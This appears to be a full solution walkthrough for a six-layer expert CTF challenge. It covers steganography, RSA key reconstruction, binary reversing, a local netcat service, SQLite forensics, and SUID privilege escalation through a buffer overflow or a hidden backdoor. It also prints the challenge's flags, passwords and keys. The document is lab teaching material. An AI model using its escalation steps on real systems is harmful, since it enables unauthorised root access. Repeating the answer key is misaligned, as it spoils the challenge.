# CTF Expert Challenge - Complete Solution (800 Points)

## Challenge Overview
- **Difficulty**: EXPERT (800 points)
- **Estimated Time**: 3-6 hours for advanced players
- **Skills Required**: Steganography, RSA Cryptography, Reverse Engineering, Network Analysis, Database Forensics, Privilege Escalation
- **Final Flag**: `ESGISCTF{3l1t3_h4ck3r_m4st3r_0f_4ll_d0m41ns_2025}`

## Connection
```bash
ssh eliteuser@localhost -p 2224
# Password: ESGISCTF{1nter@ct1ve_sh3ll_ch@ll3ng3}
```

---

## LAYER 1: Steganography

### Step 1.1: Initial Reconnaissance
```bash
# Read welcome message
cat ELITE_CHALLENGE.txt

# Explore steganography directory
cd /opt/challenge/steganography/
ls -la
```

### Step 1.2: Decode Hidden Hex Data
```bash
# Use the decoder script
./decode_hex.sh

# OR manually decode hex
cat .hex_data | xxd -r -p
```

**Expected Output:**
```
Hidden message: The cryptography vault has a RSA private-public key pair. Look for the keys in /opt/challenge/cryptography
```

---

## LAYER 2: Cryptography - RSA Key Reconstruction

### Step 2.1: Examine Crypto Directory
```bash
cd /opt/challenge/cryptography/
ls -la
# Files: key_alpha.pem, key_beta.pem, key_gamma.pem, key_delta.pem, key_epsilon.pem, encrypted_message.bin, reconstruct_key.py
```

### Step 2.2: Reconstruct RSA Private Key
```bash
# Use the Python script
python3 reconstruct_key.py

# Verify the reconstructed key
openssl rsa -in reconstructed_private.pem -check
```

### Step 2.3: Decrypt the Message
```bash
openssl rsautl -decrypt -inkey reconstructed_private.pem -in encrypted_message.bin
```

**Expected Output:**
```
Network analysis required: A hidden service is listening on localhost. Scan for unusual processes and examine the binary in /opt/challenge/reverse_engineering/
```

---

## LAYER 3: Reverse Engineering

### Step 3.1: Analyze the Binary
```bash
cd /opt/challenge/reverse_engineering/
file security_scanner
strings security_scanner | grep -i secret
```

### Step 3.2: Find Hidden Functionality
```bash
# Look for interesting strings
strings security_scanner | grep "show_secrets"

# Try the secret command
./security_scanner show_secrets
```

**Expected Output:**
```
🎉 BACKDOOR ACTIVATED! 🎉
Network Analysis Hint:
- A Python service is running on localhost:8888
- Use 'netstat -tlnp' or 'ss -tlnp' to confirm
- Connect with: nc localhost 8888
- The service requires a specific password
- Password hint: Look in the database files
```

---

## LAYER 4: Network Analysis

### Step 4.1: Scan for Hidden Service
```bash
# Check for listening services
netstat -tlnp | grep 8888
# OR
ss -tlnp | grep 8888
```

### Step 4.2: Connect to Hidden Service
```bash
nc localhost 8888
```

**Service will ask for access code. We need to find it in the database first.**

---

## LAYER 5: Database Forensics

### Step 5.1: Examine Database
```bash
cd /opt/challenge/database/
sqlite3 vault_database.db
```

### Step 5.2: Extract Access Code
```sql
.tables
SELECT * FROM access_codes;
SELECT * FROM vault_info;
.quit
```

**Found access code:** `admin_secure_2025`

### Step 5.3: Access Hidden Service
```bash
nc localhost 8888
# Enter: admin_secure_2025
```

**Service Response:**
```
Access GRANTED!
Final Challenge Information:
The ultimate flag is encrypted with AES-256-CBC
Key: master_key_quantum_2025
Encrypted flag location: /root/.vault/final_flag.enc
You need root access to read it!
Hint: Use the security_scanner binary for privilege escalation
```

---

## LAYER 6: Privilege Escalation

### Step 6.1: Exploit Buffer Overflow
```bash
cd /opt/challenge/reverse_engineering/

# The binary is SUID and has buffer overflow
# Create a payload to overflow the buffer
python3 -c "print('A' * 100)" | ./security_scanner

# OR use the secret backdoor for easier root access
./security_scanner show_secrets
# This gives you a root shell directly
```

### Step 6.2: Get Final Flag
```bash
# Now with root access
cat /root/.vault/final_flag.enc

# Decrypt with the key from database
echo "master_key_quantum_2025" > /tmp/key
openssl enc -d -aes-256-cbc -k "master_key_quantum_2025" -base64 -in /root/.vault/final_flag.enc
```

**Final Flag:** `ESGISCTF{3l1t3_h4ck3r_m4st3r_0f_4ll_d0m41ns_2025}`

---

## Alternative Methods

### Method A: Buffer Overflow Exploitation
```bash
# Generate cyclic pattern
python3 -c "
pattern = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' * 10
print(pattern)
" > payload.txt

# Test with GDB for exact offset
gdb ./security_scanner
```

### Method B: Database Base64 Decoding
```bash
# Decode base64 values in database
echo "bWFzdGVyX2tleV9xdWFudHVtXzIwMjU=" | base64 -d
echo "VGhlIGZpbmFsIGZsYWcgaXMgaGlkZGVuIGluIC9yb290Ly52YXVsdC8=" | base64 -d
```

---

## Challenge Statistics

- **Total Steps**: ~25 commands
- **Layers Completed**: 6 security layers
- **Techniques Used**: 
  - Hex decoding
  - RSA cryptography
  - Reverse engineering
  - Network scanning
  - SQL queries
  - Privilege escalation
  - AES decryption

**Estimated Solve Time**: 3-6 hours for expert players
